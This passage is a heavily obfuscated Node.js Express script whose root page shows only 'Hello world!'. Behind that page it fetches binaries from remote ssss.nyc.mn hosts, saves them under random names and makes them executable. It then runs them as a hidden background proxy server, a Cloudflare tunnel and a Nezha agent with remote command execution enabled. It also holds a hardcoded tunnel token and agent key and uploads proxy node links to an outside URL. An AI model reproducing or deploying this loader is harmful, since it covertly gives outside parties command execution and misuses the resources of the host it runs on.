const _0x3d4905=_0x14e4;(function(_0x5bd0bf,_0xb750d5){const _0x3ac970={_0x5e8e80:0x13b,_0x4cf6a1:0xc7,_0x3d7731:0x164,_0x1c46a2:0xc5,_0xc4af2a:0xd6,_0x99038b:0x116},_0x497147=_0x14e4,_0x39b493=_0x5bd0bf();while(!![]){try{const _0x218bb9=-parseInt(_0x497147(_0x3ac970._0x5e8e80))/0x1+-parseInt(_0x497147(_0x3ac970._0x4cf6a1))/0x2*(parseInt(_0x497147(0x15c))/0x3)+-parseInt(_0x497147(_0x3ac970._0x3d7731))/0x4*(parseInt(_0x497147(_0x3ac970._0x1c46a2))/0x5)+-parseInt(_0x497147(0xb0))/0x6*(-parseInt(_0x497147(0x129))/0x7)+parseInt(_0x497147(_0x3ac970._0xc4af2a))/0x8+-parseInt(_0x497147(0xbb))/0x9+-parseInt(_0x497147(_0x3ac970._0x99038b))/0xa*(-parseInt(_0x497147(0xe8))/0xb);if(_0x218bb9===_0xb750d5)break;else _0x39b493['push'](_0x39b493['shift']());}catch(_0x23ebac){_0x39b493['push'](_0x39b493['shift']());}}}(_0x47d7,0x42f86));const express=require(_0x3d4905(0xba)),app=express(),axios=require(_0x3d4905(0xce)),os=require('os'),fs=require('fs'),path=require(_0x3d4905(0x14b)),{promisify}=require('util'),exec=promisify(require(_0x3d4905(0x15e))[_0x3d4905(0x153)]),{execSync}=require(_0x3d4905(0x15e)),UPLOAD_URL=process[_0x3d4905(0x12e)][_0x3d4905(0xb1)]||'',PROJECT_URL=process['env'][_0x3d4905(0xb2)]||'',AUTO_ACCESS=process['env'][_0x3d4905(0xac)]||![],FILE_PATH=process[_0x3d4905(0x12e)][_0x3d4905(0xda)]||_0x3d4905(0x13d),SUB_PATH=process[_0x3d4905(0x12e)][_0x3d4905(0x10a)]||_0x3d4905(0xd5),PORT=process[_0x3d4905(0x12e)][_0x3d4905(0xa9)]||process[_0x3d4905(0x12e)][_0x3d4905(0xf2)]||0xbb8,UUID=process['env'][_0x3d4905(0xa6)]||_0x3d4905(0x130),NEZHA_SERVER=process[_0x3d4905(0x12e)][_0x3d4905(0xd8)]||_0x3d4905(0xa7),NEZHA_PORT=process[_0x3d4905(0x12e)][_0x3d4905(0x12b)]||'',NEZHA_KEY=process[_0x3d4905(0x12e)]['NEZHA_KEY']||_0x3d4905(0xde),ARGO_DOMAIN=process[_0x3d4905(0x12e)]['ARGO_DOMAIN']||_0x3d4905(0x134),ARGO_AUTH=process[_0x3d4905(0x12e)][_0x3d4905(0x15d)]||'eyJhIjoiYTE0OWY4NjIzN2Y0ZWE1NzFmMTBiNGQ4NTI1YmM5ZDkiLCJ0IjoiMDMxYTc3ZjUtOTMzZi00MTVkLWI1MGMtMGVmM2M5YmQ4M2UwIiwicyI6Ik1HWXpORFpoTVRrdE9HWXhZaTAwWW1ZM0xXRmpNemd0WW1WaU0yRXlabVl5T1dRdyJ9',ARGO_PORT=process[_0x3d4905(0x12e)][_0x3d4905(0x105)]||0x1f41,CFIP=process[_0x3d4905(0x12e)][_0x3d4905(0xff)]||'cdns.doon.eu.org',CFPORT=process[_0x3d4905(0x12e)][_0x3d4905(0x124)]||0x1bb,NAME=process[_0x3d4905(0x12e)][_0x3d4905(0xc8)]||_0x3d4905(0x119);!fs['existsSync'](FILE_PATH)?(fs[_0x3d4905(0x133)](FILE_PATH),console['log'](FILE_PATH+_0x3d4905(0x137))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x261318={_0x5e549b:0x107,_0x20f6a1:0x12a},_0x164c32=_0x3d4905,_0x2a2d56=_0x164c32(0x118);let _0x10c1cf='';for(let _0x563e0c=0x0;_0x563e0c<0x6;_0x563e0c++){_0x10c1cf+=_0x2a2d56['charAt'](Math['floor'](Math[_0x164c32(_0x261318._0x5e549b)]()*_0x2a2d56[_0x164c32(_0x261318._0x20f6a1)]));}return _0x10c1cf;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3d4905(0x11f)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x3d4905(0x11f)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x3d4905(0xeb)),listPath=path[_0x3d4905(0x11f)](FILE_PATH,_0x3d4905(0x144)),bootLogPath=path[_0x3d4905(0x11f)](FILE_PATH,_0x3d4905(0xe7)),configPath=path['join'](FILE_PATH,_0x3d4905(0xae));function deleteNodes(){const _0x11d3f6={_0x55d5fa:0x138,_0xf12f7b:0xb9,_0x52f066:0xdf},_0x4d6e39=_0x3d4905;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x22eea7;try{_0x22eea7=fs[_0x4d6e39(_0x11d3f6._0x55d5fa)](subPath,_0x4d6e39(_0x11d3f6._0xf12f7b));}catch{return null;}const _0x459ef0=Buffer[_0x4d6e39(0xe4)](_0x22eea7,_0x4d6e39(0xe9))[_0x4d6e39(0x128)](_0x4d6e39(_0x11d3f6._0xf12f7b)),_0x8c46b5=_0x459ef0['split']('\x0a')['filter'](_0x29de53=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x29de53));if(_0x8c46b5[_0x4d6e39(0x12a)]===0x0)return;return axios[_0x4d6e39(0xc2)](UPLOAD_URL+_0x4d6e39(0xdd),JSON[_0x4d6e39(0x115)]({'nodes':_0x8c46b5}),{'headers':{'Content-Type':_0x4d6e39(0xf9)}})[_0x4d6e39(_0x11d3f6._0x52f066)](_0x45224a=>{return null;}),null;}catch(_0x3bbd14){return null;}}function cleanupOldFiles(){const _0x3929d6={_0x27bbf0:0xec},_0xd327ac={_0x1c0218:0xa8},_0x3eef94=_0x3d4905;try{const _0x338890=fs[_0x3eef94(0x135)](FILE_PATH);_0x338890[_0x3eef94(_0x3929d6._0x27bbf0)](_0x59927f=>{const _0x1d25e2=_0x3eef94,_0x1eb187=path['join'](FILE_PATH,_0x59927f);try{const _0x3aea80=fs[_0x1d25e2(0x14c)](_0x1eb187);_0x3aea80[_0x1d25e2(_0xd327ac._0x1c0218)]()&&fs[_0x1d25e2(0x110)](_0x1eb187);}catch(_0x3285ff){}});}catch(_0x505af8){}}app[_0x3d4905(0xf1)]('/',function(_0xdfc6eb,_0x3dc370){const _0x123dbf={_0x533f2a:0xb5},_0x5b0950=_0x3d4905;_0x3dc370[_0x5b0950(_0x123dbf._0x533f2a)](_0x5b0950(0x161));});async function generateConfig(){const _0x3e7eb4={_0x22c136:0xea,_0x3e10f5:0x11a,_0x410066:0xef,_0x42b066:0x14d,_0x24196b:0xc6,_0x1e067f:0x156,_0x5e5992:0xd7,_0x248b0a:0xe1,_0x1756a0:0xfa,_0x208e73:0xc6,_0x9539b1:0x157,_0x3da938:0x162,_0x31eb31:0x12c,_0x376d96:0x11f,_0x4f1689:0xae},_0x16efa1=_0x3d4905,_0x4231eb={'log':{'access':_0x16efa1(_0x3e7eb4._0x22c136),'error':_0x16efa1(_0x3e7eb4._0x22c136),'loglevel':_0x16efa1(_0x3e7eb4._0x3e10f5)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x16efa1(0x156),'settings':{'clients':[{'id':UUID,'flow':_0x16efa1(_0x3e7eb4._0x410066)}],'decryption':_0x16efa1(0x11a),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x16efa1(_0x3e7eb4._0x42b066),'dest':0xbbc}]},'streamSettings':{'network':_0x16efa1(0xd1)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x16efa1(0x156),'settings':{'clients':[{'id':UUID}],'decryption':_0x16efa1(0x11a)},'streamSettings':{'network':'tcp','security':_0x16efa1(0x11a)}},{'port':0xbba,'listen':_0x16efa1(_0x3e7eb4._0x24196b),'protocol':_0x16efa1(_0x3e7eb4._0x1e067f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x16efa1(_0x3e7eb4._0x3e10f5)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x16efa1(_0x3e7eb4._0x5e5992)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x16efa1(0x11d),_0x16efa1(_0x3e7eb4._0x248b0a)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x16efa1(_0x3e7eb4._0x1756a0),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x16efa1(0x136)}},'sniffing':{'enabled':!![],'destOverride':[_0x16efa1(0x145),_0x16efa1(0x11d),_0x16efa1(0xe1)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x16efa1(_0x3e7eb4._0x208e73),'protocol':_0x16efa1(0x14e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x16efa1(0x145),_0x16efa1(0x11d),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x16efa1(_0x3e7eb4._0x9539b1)]},'outbounds':[{'protocol':_0x16efa1(_0x3e7eb4._0x3da938),'tag':_0x16efa1(0xf0)},{'protocol':_0x16efa1(0x142),'tag':_0x16efa1(_0x3e7eb4._0x31eb31)}]};fs[_0x16efa1(0xb8)](path[_0x16efa1(_0x3e7eb4._0x376d96)](FILE_PATH,_0x16efa1(_0x3e7eb4._0x4f1689)),JSON['stringify'](_0x4231eb,null,0x2));}function getSystemArchitecture(){const _0x319838={_0x48f93c:0x122},_0x47b413=_0x3d4905,_0x55839d=os[_0x47b413(_0x319838._0x48f93c)]();return _0x55839d===_0x47b413(0xc3)||_0x55839d===_0x47b413(0x121)||_0x55839d===_0x47b413(0xbf)?_0x47b413(0xc3):_0x47b413(0x159);}function _0x47d7(){const _0x301729=['path','statSync','/trojan-argo','trojan','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','success','pop','rm\x20-rf\x20','exec','clear','includes','vless','https+local://8.8.8.8/dns-query','\x20>/dev/null\x202>&1','amd','error','Subscription\x20uploaded\x20successfully','3AZtxGX','ARGO_AUTH','child_process','Content-Type','pkill\x20-f\x20\x22[','Hello\x20world!','freedom','\x20-s\x20','12DoagOu','\x20failed:\x20','platform','https://amd64.ssss.nyc.mn/web','8443','existsSync','--tls','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','web\x20running\x20error:\x20','UUID','nz.aiiu.qzz.io:8008','isFile','SERVER_PORT','?encryption=none&security=tls&sni=','set','AUTO_ACCESS','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','config.json','Empowerment\x20success\x20for\x20','72EwFsar','UPLOAD_URL','PROJECT_URL','2083','Unknown','send','https://ipapi.co/json/','pipe','writeFileSync','utf-8','express','2542266nCWCJG','push','Error\x20in\x20startserver:','\x0a\x20\x20\x20\x20','aarch64','/tunnel.yml\x20run','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','post','arm','createWriteStream','601760QUAFXH','127.0.0.1','12234vVOaUd','NAME','\x0a\x0atrojan://','org','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','axios','tunnel.yml','Skipping\x20adding\x20automatic\x20access\x20task','tcp','countryCode','basename','response','dev','3038408kUjWPw','/vless-argo','NEZHA_SERVER','all','FILE_PATH','map','App\x20is\x20running','/api/delete-nodes','xf6D2nwnhJsUB9rdkUqSNknQtiv1lIZA','catch','2087','quic','match','automatic\x20access\x20task\x20added\x20successfully','from','unlink','\x0a\x0avmess://','boot.log','979uVyBeV','base64','/dev/null','sub.txt','forEach','/api/add-nodes','\x20-c\x20','xtls-rprx-vision','direct','get','PORT','tunnel.json','nohup\x20','country_code','https://arm64.ssss.nyc.mn/agent','listen','config.yaml','application/json','vmess','php\x20running\x20error:\x20','Error\x20executing\x20command:\x20','TunnelSecret','\x22\x20>\x20/dev/null\x202>&1','CFIP','NEZHA\x20variable\x20is\x20empty,skip\x20running','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20is\x20running','Error\x20reading\x20boot.log:','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','ARGO_PORT','\x20successfully','random','\x20-p\x20','\x20>/dev/null\x202>&1\x20&','SUB_PATH','https://amd64.ssss.nyc.mn/bot','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','&path=%2Fvless-argo%3Fed%3D2560#','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Download\x20','unlinkSync','filter','fileName','firefox','chmod','stringify','33850eVeUau','then','abcdefghijklmnopqrstuvwxyz','LeaFlow-xiaodudea1','none','\x20>\x20nul\x202>&1','443','tls','2053','join','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','arm64','arch','split','CFPORT','data','http://ip-api.com/json/','stream','toString','235529TiJhyu','length','NEZHA_PORT','block','text/plain;\x20charset=utf-8','env','status','0134dd40-2f8f-401d-9269-587fb2be6e8a','test','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','mkdirSync','leaflow1.hnhk.qzz.io','readdirSync','/vmess-argo','\x20is\x20created','readFileSync','https://amd64.ssss.nyc.mn/agent','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','160873QzetTC','false','./tmp','message','\x20-c\x20\x22','2096','Nodes\x20uploaded\x20successfully','blackhole','https://amd64.ssss.nyc.mn/v1','list.txt','http','Error\x20downloading\x20files:','&fp=firefox&type=ws&host=','win32','log','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&'];_0x47d7=function(){return _0x301729;};return _0x47d7();}function downloadFile(_0x5f19b3,_0x3caa2f,_0x40d576){const _0x110974={_0x3e4436:0x133,_0x434765:0x127,_0x453889:0x117},_0x90a121={_0x2d020b:0x165,_0x35ebe0:0x13e,_0x75bba4:0x15a},_0x408772=_0x3d4905,_0x3e688b=_0x5f19b3;!fs[_0x408772(0xa2)](FILE_PATH)&&fs[_0x408772(_0x110974._0x3e4436)](FILE_PATH,{'recursive':!![]});const _0x134a1d=fs[_0x408772(0xc4)](_0x3e688b);axios({'method':_0x408772(0xf1),'url':_0x3caa2f,'responseType':_0x408772(_0x110974._0x434765)})[_0x408772(_0x110974._0x453889)](_0x4b6bd1=>{const _0x3f2224={_0x4891b6:0xe5,_0x69f634:0x10f,_0x39fa8c:0xd3,_0x3bdbf6:0x13e},_0x533fe6={_0x37c2ff:0x10f,_0x579bd1:0x106},_0x228371=_0x408772;_0x4b6bd1[_0x228371(0x125)][_0x228371(0xb7)](_0x134a1d),_0x134a1d['on']('finish',()=>{const _0x5aaf1d=_0x228371;_0x134a1d['close'](),console['log'](_0x5aaf1d(_0x533fe6._0x37c2ff)+path[_0x5aaf1d(0xd3)](_0x3e688b)+_0x5aaf1d(_0x533fe6._0x579bd1)),_0x40d576(null,_0x3e688b);}),_0x134a1d['on'](_0x228371(0x15a),_0x5516a1=>{const _0x5f135a=_0x228371;fs[_0x5f135a(_0x3f2224._0x4891b6)](_0x3e688b,()=>{});const _0x6d071c=_0x5f135a(_0x3f2224._0x69f634)+path[_0x5f135a(_0x3f2224._0x39fa8c)](_0x3e688b)+_0x5f135a(0x165)+_0x5516a1[_0x5f135a(_0x3f2224._0x3bdbf6)];console[_0x5f135a(0x15a)](_0x6d071c),_0x40d576(_0x6d071c);});})['catch'](_0x4114cc=>{const _0x140f31=_0x408772,_0x16db3f=_0x140f31(0x10f)+path[_0x140f31(0xd3)](_0x3e688b)+_0x140f31(_0x90a121._0x2d020b)+_0x4114cc[_0x140f31(_0x90a121._0x35ebe0)];console[_0x140f31(_0x90a121._0x75bba4)](_0x16db3f),_0x40d576(_0x16db3f);});}async function downloadFilesAndRun(){const _0x192ba7={_0xa87ecc:0xc1,_0x2497a2:0x155,_0x10a5f9:0x123,_0x362a51:0x151,_0x3f637e:0x13c,_0x13bb16:0xcc,_0x10e62d:0x10e,_0x1767d1:0xb8,_0x1f3145:0x13f,_0x4ed666:0x14f,_0xae8d52:0x149,_0x1cee0b:0xfb,_0x28d604:0xa1,_0x411c4c:0x11e,_0x351c86:0xa3,_0x2537f4:0x163,_0x4f9898:0x108,_0x5e6d97:0x149,_0x2069ac:0x102,_0x2fc3d0:0x15a,_0x341edc:0x100,_0x4f638c:0xf4,_0x8d22fa:0x149,_0x54ca7c:0xa2,_0x17e72d:0xe2,_0x9d3cf2:0x104,_0x1cbe9d:0xc0},_0x37a258={_0x422c35:0xec},_0x4d803b=_0x3d4905,_0x47dafc=getSystemArchitecture(),_0x5e49e2=getFilesForArchitecture(_0x47dafc);if(_0x5e49e2[_0x4d803b(0x12a)]===0x0){console['log'](_0x4d803b(_0x192ba7._0xa87ecc));return;}const _0x3b044f=_0x5e49e2[_0x4d803b(0xdb)](_0x6cb70a=>{const _0x5b814a={_0x31accb:0x112};return new Promise((_0x2a8a39,_0x480938)=>{const _0x504d2f=_0x14e4;downloadFile(_0x6cb70a[_0x504d2f(_0x5b814a._0x31accb)],_0x6cb70a['fileUrl'],(_0x55519d,_0x2cee22)=>{_0x55519d?_0x480938(_0x55519d):_0x2a8a39(_0x2cee22);});});});try{await Promise[_0x4d803b(0xd9)](_0x3b044f);}catch(_0x37849d){console['error'](_0x4d803b(0x146),_0x37849d);return;}function _0x1f3c40(_0x5e0347){const _0x16ba31={_0x11114e:0x149,_0x3cd982:0xaf},_0x22fe13=_0x4d803b,_0x4a9802=0x1fd;_0x5e0347[_0x22fe13(_0x37a258._0x422c35)](_0x42a512=>{const _0x458263=_0x22fe13;fs[_0x458263(0xa2)](_0x42a512)&&fs[_0x458263(0x114)](_0x42a512,_0x4a9802,_0x415d59=>{const _0x12bfc0=_0x458263;_0x415d59?console['error']('Empowerment\x20failed\x20for\x20'+_0x42a512+':\x20'+_0x415d59):console[_0x12bfc0(_0x16ba31._0x11114e)](_0x12bfc0(_0x16ba31._0x3cd982)+_0x42a512+':\x20'+_0x4a9802['toString'](0x8));});});}const _0x1dc0d7=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1f3c40(_0x1dc0d7);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4bdf4d=NEZHA_SERVER[_0x4d803b(_0x192ba7._0x2497a2)](':')?NEZHA_SERVER[_0x4d803b(_0x192ba7._0x10a5f9)](':')[_0x4d803b(_0x192ba7._0x362a51)]():'',_0x5e78df=new Set([_0x4d803b(0x11c),_0x4d803b(0xa1),_0x4d803b(0x140),'2087',_0x4d803b(0xb3),_0x4d803b(0x11e)]),_0x176f22=_0x5e78df['has'](_0x4bdf4d)?'true':_0x4d803b(_0x192ba7._0x3f637e),_0x217b4f='\x0aclient_secret:\x20'+NEZHA_KEY+_0x4d803b(_0x192ba7._0x13bb16)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x176f22+_0x4d803b(_0x192ba7._0x10e62d)+UUID;fs[_0x4d803b(_0x192ba7._0x1767d1)](path[_0x4d803b(0x11f)](FILE_PATH,_0x4d803b(0xf8)),_0x217b4f);const _0x2eee70='nohup\x20'+phpPath+_0x4d803b(_0x192ba7._0x1f3145)+FILE_PATH+_0x4d803b(_0x192ba7._0x4ed666);try{await exec(_0x2eee70),console[_0x4d803b(_0x192ba7._0xae8d52)](phpName+'\x20is\x20running'),await new Promise(_0x478b8f=>setTimeout(_0x478b8f,0x3e8));}catch(_0x3c3685){console['error'](_0x4d803b(_0x192ba7._0x1cee0b)+_0x3c3685);}}else{let _0x11f87c='';const _0x4d9545=['443',_0x4d803b(_0x192ba7._0x28d604),_0x4d803b(0x140),_0x4d803b(0xe0),_0x4d803b(0xb3),_0x4d803b(_0x192ba7._0x411c4c)];_0x4d9545['includes'](NEZHA_PORT)&&(_0x11f87c=_0x4d803b(_0x192ba7._0x351c86));const _0x28ed85=_0x4d803b(0xf4)+npmPath+_0x4d803b(_0x192ba7._0x2537f4)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4d803b(_0x192ba7._0x4f9898)+NEZHA_KEY+'\x20'+_0x11f87c+_0x4d803b(0x14a);try{await exec(_0x28ed85),console[_0x4d803b(_0x192ba7._0x5e6d97)](npmName+_0x4d803b(_0x192ba7._0x2069ac)),await new Promise(_0x38dacb=>setTimeout(_0x38dacb,0x3e8));}catch(_0x1956e6){console[_0x4d803b(_0x192ba7._0x2fc3d0)]('npm\x20running\x20error:\x20'+_0x1956e6);}}}else console[_0x4d803b(0x149)](_0x4d803b(_0x192ba7._0x341edc));const _0x278e1f=_0x4d803b(_0x192ba7._0x4f638c)+webPath+_0x4d803b(0xee)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x278e1f),console[_0x4d803b(_0x192ba7._0x8d22fa)](webName+_0x4d803b(_0x192ba7._0x2069ac)),await new Promise(_0x25fc77=>setTimeout(_0x25fc77,0x3e8));}catch(_0x524f64){console[_0x4d803b(0x15a)](_0x4d803b(0xa5)+_0x524f64);}if(fs[_0x4d803b(_0x192ba7._0x54ca7c)](botPath)){let _0x1f63b2;if(ARGO_AUTH[_0x4d803b(_0x192ba7._0x17e72d)](/^[A-Z0-9a-z=]{120,250}$/))_0x1f63b2='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x4d803b(0xe2)](/TunnelSecret/)?_0x1f63b2=_0x4d803b(_0x192ba7._0x9d3cf2)+FILE_PATH+_0x4d803b(_0x192ba7._0x1cbe9d):_0x1f63b2=_0x4d803b(0x120)+FILE_PATH+_0x4d803b(0x132)+ARGO_PORT;try{await exec(_0x4d803b(_0x192ba7._0x4f638c)+botPath+'\x20'+_0x1f63b2+_0x4d803b(0x109)),console[_0x4d803b(0x149)](botName+_0x4d803b(_0x192ba7._0x2069ac)),await new Promise(_0x551908=>setTimeout(_0x551908,0x7d0));}catch(_0x2d1d63){console[_0x4d803b(0x15a)](_0x4d803b(0xfc)+_0x2d1d63);}}await new Promise(_0x542838=>setTimeout(_0x542838,0x1388));}function getFilesForArchitecture(_0x1db06d){const _0x5d054a={_0x1521e5:0xa0,_0x2d38ff:0xf6,_0x41e9ad:0x139,_0x56cba9:0x143},_0x7eec37=_0x3d4905;let _0x165a1a;_0x1db06d===_0x7eec37(0xc3)?_0x165a1a=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x165a1a=[{'fileName':webPath,'fileUrl':_0x7eec37(_0x5d054a._0x1521e5)},{'fileName':botPath,'fileUrl':_0x7eec37(0x10b)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5b4ec7=_0x1db06d===_0x7eec37(0xc3)?_0x7eec37(_0x5d054a._0x2d38ff):_0x7eec37(_0x5d054a._0x41e9ad);_0x165a1a['unshift']({'fileName':npmPath,'fileUrl':_0x5b4ec7});}else{const _0x226185=_0x1db06d===_0x7eec37(0xc3)?'https://arm64.ssss.nyc.mn/v1':_0x7eec37(_0x5d054a._0x56cba9);_0x165a1a['unshift']({'fileName':phpPath,'fileUrl':_0x226185});}}return _0x165a1a;}function argoType(){const _0x2e34a2={_0x3cccf8:0x10c,_0x1dacc7:0x155,_0x51e983:0xb8,_0x22be17:0x123,_0x2473a9:0xf3,_0x4048b9:0xa4},_0x516fbc=_0x3d4905;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x516fbc(_0x2e34a2._0x3cccf8));return;}if(ARGO_AUTH[_0x516fbc(_0x2e34a2._0x1dacc7)](_0x516fbc(0xfd))){fs[_0x516fbc(_0x2e34a2._0x51e983)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x2e729e='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x516fbc(_0x2e34a2._0x22be17)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x516fbc(0x11f)](FILE_PATH,_0x516fbc(_0x2e34a2._0x2473a9))+_0x516fbc(_0x2e34a2._0x4048b9)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x516fbc(0xad);fs['writeFileSync'](path['join'](FILE_PATH,_0x516fbc(0xcf)),_0x2e729e);}else console[_0x516fbc(0x149)](_0x516fbc(0x13a));}async function extractDomains(){const _0x6c0fa7={_0x30060d:0x138,_0x3fdfea:0x149,_0x1b732d:0xe7,_0x55ac19:0x109,_0x90a170:0xfc,_0x56a188:0x15a},_0x374e0e={_0x27c860:0xf1,_0xe93aea:0xb6,_0x73e324:0x125,_0x176205:0xf5,_0x2334e7:0x126,_0x2a7c1f:0x150,_0x73952d:0x125,_0x47a314:0x125,_0x467739:0xd2,_0xb92e92:0xca},_0x43f5d2={_0x52d1f9:0x166,_0x328153:0xfe},_0x4b07c4={_0x3e1f8a:0xe2},_0x51d431=_0x3d4905;let _0x897490;if(ARGO_AUTH&&ARGO_DOMAIN)_0x897490=ARGO_DOMAIN,console[_0x51d431(0x149)]('ARGO_DOMAIN:',_0x897490),await _0x1f9ac0(_0x897490);else try{const _0x8a46f2=fs[_0x51d431(_0x6c0fa7._0x30060d)](path[_0x51d431(0x11f)](FILE_PATH,_0x51d431(0xe7)),'utf-8'),_0x406cb0=_0x8a46f2[_0x51d431(0x123)]('\x0a'),_0x1420f4=[];_0x406cb0[_0x51d431(0xec)](_0x461940=>{const _0x56819a=_0x51d431,_0xef7b5c=_0x461940[_0x56819a(_0x4b07c4._0x3e1f8a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xef7b5c){const _0x3887c9=_0xef7b5c[0x1];_0x1420f4['push'](_0x3887c9);}});if(_0x1420f4[_0x51d431(0x12a)]>0x0)_0x897490=_0x1420f4[0x0],console[_0x51d431(0x149)]('ArgoDomain:',_0x897490),await _0x1f9ac0(_0x897490);else{console[_0x51d431(_0x6c0fa7._0x3fdfea)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x51d431(0x110)](path[_0x51d431(0x11f)](FILE_PATH,_0x51d431(_0x6c0fa7._0x1b732d)));async function _0x28d154(){const _0x3d2bcd=_0x51d431;try{process[_0x3d2bcd(_0x43f5d2._0x52d1f9)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x3d2bcd(0x160)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x3d2bcd(_0x43f5d2._0x328153));}catch(_0xa667cc){}}_0x28d154(),await new Promise(_0x5beae7=>setTimeout(_0x5beae7,0xbb8));const _0x1d2935=_0x51d431(0x120)+FILE_PATH+_0x51d431(0x132)+ARGO_PORT;try{await exec(_0x51d431(0xf4)+botPath+'\x20'+_0x1d2935+_0x51d431(_0x6c0fa7._0x55ac19)),console[_0x51d431(0x149)](botName+_0x51d431(0x102)),await new Promise(_0x13b8e7=>setTimeout(_0x13b8e7,0xbb8)),await extractDomains();}catch(_0xa39cdc){console['error'](_0x51d431(_0x6c0fa7._0x90a170)+_0xa39cdc);}}}catch(_0x80eac1){console[_0x51d431(_0x6c0fa7._0x56a188)](_0x51d431(0x103),_0x80eac1);}async function _0x3609cd(){const _0x53e96f=_0x51d431;try{const _0x248fdb=await axios[_0x53e96f(_0x374e0e._0x27c860)](_0x53e96f(_0x374e0e._0xe93aea),{'timeout':0xbb8});if(_0x248fdb[_0x53e96f(_0x374e0e._0x73e324)]&&_0x248fdb[_0x53e96f(0x125)][_0x53e96f(_0x374e0e._0x176205)]&&_0x248fdb[_0x53e96f(_0x374e0e._0x73e324)][_0x53e96f(0xca)])return _0x248fdb[_0x53e96f(0x125)]['country_code']+'_'+_0x248fdb[_0x53e96f(0x125)]['org'];}catch(_0x3c63d9){try{const _0x5af6e0=await axios[_0x53e96f(_0x374e0e._0x27c860)](_0x53e96f(_0x374e0e._0x2334e7),{'timeout':0xbb8});if(_0x5af6e0[_0x53e96f(_0x374e0e._0x73e324)]&&_0x5af6e0[_0x53e96f(0x125)][_0x53e96f(0x12f)]===_0x53e96f(_0x374e0e._0x2a7c1f)&&_0x5af6e0[_0x53e96f(_0x374e0e._0x73952d)][_0x53e96f(0xd2)]&&_0x5af6e0[_0x53e96f(_0x374e0e._0x47a314)]['org'])return _0x5af6e0[_0x53e96f(_0x374e0e._0x47a314)][_0x53e96f(_0x374e0e._0x467739)]+'_'+_0x5af6e0['data'][_0x53e96f(_0x374e0e._0xb92e92)];}catch(_0x335a0f){}}return _0x53e96f(0xb4);}async function _0x1f9ac0(_0x1794e6){const _0x388c70=await _0x3609cd(),_0x168d89=NAME?NAME+'-'+_0x388c70:_0x388c70;return new Promise(_0x1ad19d=>{const 